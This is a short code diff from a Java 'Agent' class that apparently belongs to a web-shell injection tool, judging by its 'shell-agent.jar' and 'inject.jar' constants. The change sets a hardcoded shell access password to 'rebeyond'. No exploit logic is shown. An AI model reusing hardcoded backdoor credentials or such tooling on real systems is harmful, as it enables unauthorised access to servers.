@@ -15,7 +15,7 @@ public class Agent {
     public static PrintStream out = System.out;
     public static InstrumentationContext context = new InstrumentationContext();
     public static String currentPath;
-    public static String password = "test";
+    public static String password = "rebeyond";
     private final static String AGENT_NAME = "shell-agent.jar";
     private final static String INJECT_NAME = "inject.jar";
 
